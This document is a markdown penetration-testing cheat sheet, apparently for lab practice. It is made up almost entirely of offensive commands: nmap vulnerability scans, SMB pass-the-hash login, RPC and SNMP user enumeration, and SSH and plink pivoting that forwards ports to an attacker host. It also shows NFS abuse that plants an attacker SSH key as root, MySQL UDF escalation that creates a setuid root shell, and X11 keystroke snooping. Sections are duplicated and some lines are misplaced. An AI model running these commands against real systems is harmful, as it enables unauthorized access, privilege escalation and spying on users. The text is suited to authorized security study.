
### Service Enumeration To Identify how Many TCP and UDP Port is being Opened

| for Example  |
| ------------- |
|nmap -Pn -n --open -p500  192.168.0.0/24 |
|nmap -Pn -n --open -p161  192.168.0.0/24 |
|nmap -p445 --script smb-vuln-ms17-010 x.x.x.0/24|
|nmap -sV --script=realvnc-auth-bypass x.x.x.0/24|
|nmap --script http-webdav-scan -p80,8080 x.x.x.0/24|
|nmap -Pn -n --open -p6000-6005 --script=x11-access 172.31.6.0/24  |
| nmap -Pn -n --open -p3389 --script=rdp-vuln-ms12-020,rdp-enum-encryption 172.31.6.0/24 |
| nmap -sT -PN -n -sV -p 21,22,23,25,80,110,139,443,445,1433,1521,3306,3389,8080,10000 192.168.2.9/24 |
| nmap -sT -PN -n -sV -p 21,22,23,25,80,110,139,443,445,1433,1521,3306,3389,8080,10000 192.168.2.9/24 | awk '/22\/open/ {print $2}' |


### Linux and Microsoft RPC service Enumeration

| for Example |
| ------------- |
| smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' |
| smbclient -N -L \\\\10.10.10.103 |
| smbclient \\\\10.10.10.103\\C$ -U "Administrator" --pw-nt-hash f6b7160bfc91823792e0ac3a162c9267 |
| nmap -Pn -n --open -p3389 --script=rdp-vuln-ms12-020,rdp-enum-encryption 172.31.6.0/24 |
| nmap -sT -PN -n -sV -p 21,22,23,25,80,110,139,443,445,1433,1521,3306,3389,8080,10000 192.168.2.9/24 |
| nmap -sT -PN -n -sV -p 21,22,23,25,80,110,139,443,445,1433,1521,3306,3389,8080,10000 192.168.2.9/24 | awk '/22\/open/ {print $2}' |

### Commonly Users and Service Enumeration Through Running RPC and SNMP Services

|for Example  |
| ------------- |
|rpcclient –U “” [target IP address] |
| > querydominfo |
| >enumdomusers|
| >queryuser msfadmin| 
| >queryuser msfadmin|
|snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.25 #User|
|snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2 # Running Service|
| snmpwalk -c public -v1 $TARGET .1.3.6.1.2.1.1.5 #Hostname |
|snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.3.1.1 #Share Information|
|snmpwalk -c public -v1 $TARGET4 1.3.6.1.2.1.6.13.1.3 #Openning Port|



### Advanced SSH Tunneling and Port Forward

| for Example |
| ------------- |
|ssh -L 127.0.0.1:8080:127.0.0.1:80 remotehost |
|ssh -nNT -L 8000:localhost:3306 user@pivoting host #Local Port Forwarding |
|ssh -nNT -R 0.0.0.0:4000:192.168.1.101:631 user@pivot host |
|ssh -D 5000 -nNT user@pivoting host #SOCKS Proxy|
|ssh -p 13339 -f -N j0hn@10.11.1.252  |
|ssh -N -f -D 8888 -p 22000 j0hn@192.168.13.252 |
|plink.exe -l root -pw  -R 445:127.0.0.1:445 10.10.14.8 #winexe -U Administrator //127.0.0.1 "cmd.exe|
|plink.exe -l root -pw  -R 3389:127.0.0.1:3389 10.10.14.8 #rdesktop -U Administrator 127.0.0.1 |
|ssh -nNT -R 3389:localhost:3389 user@pivot host #Remote Port Forward |
|netsh interface portproxy add v4tov4 listenport=1111 Compromise Box=x.x.x.1 connectport=1111 connectaddress=Attacker|
|netsh interface portproxy add v4tov4 listenport=1111 listenaddress=x.x.x.1 connectport=1111 connectaddress=x.x.x.10 |
|netsh interface portproxy add v4tov4 listenport=9001 listenaddress=x.x.x.1 connectport=9001 connectaddress=x.x.x.100 |


### Insecure NFS Share Vulnerabilities

| for Example |
| ------------- |
| showmount -e 192.168.100.25 #Check if any share is available |
| mount -t nfs 192.168.100.25:/home /tmp/NFS |
| mount -t nfs 192.168.1.112:/ /mnt -o nolock |
| mkdir -p /root/.ssh # We May Upload SSH Key to NFS |
| ssh-keygen -t rsa -b 4096 |
| cp /root/.ssh/hacker_rsa.pub /mnt/root/.ssh/ |
| cat authorized_keys |
| cat id_rsa.pub >> authorized_keys |
|ssh -i /root/.ssh/hacker_rsa root@192.168.1.112|


### MySQL Privilge Escalation Through UDF

| for Example|
| ------------- |
|gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc|
| use mysql; |
|create table npn(line blob); |
| insert into npn values(load_file('/tmp/raptor_udf2.so')); |
|select * from npn into dumpfile '/usr/lib/raptor_udf2.so';|
| create function do_system returns integer soname 'raptor_udf2.so'; |
| select do_system('chown root:root /tmp/sid-shell; chmod +s /tmp/sid-shell'); |


### X 11  Commond Vulnerability

| for Example  |
| ------------- |
| use auxiliary/scanner/x11/open_x11 |
| nmap -p 6000 --script=x11-access 192.168.2.26,75 |
|create table npn(line blob); |
| xdpyinfo -display 192.168.2.75:0 | head -n 5 |
|xspy -display 192.168.1.23:0 -delay 100|

| Linxu and Microsoft RPC Enumeration  |
| ------------- |
| smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' |
| smbclient -N -L \\\\10.10.10.103 |

| Linxu and Microsoft RPC Enumeration  |
| ------------- |
| smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' |
| smbclient -N -L \\\\10.10.10.103 |

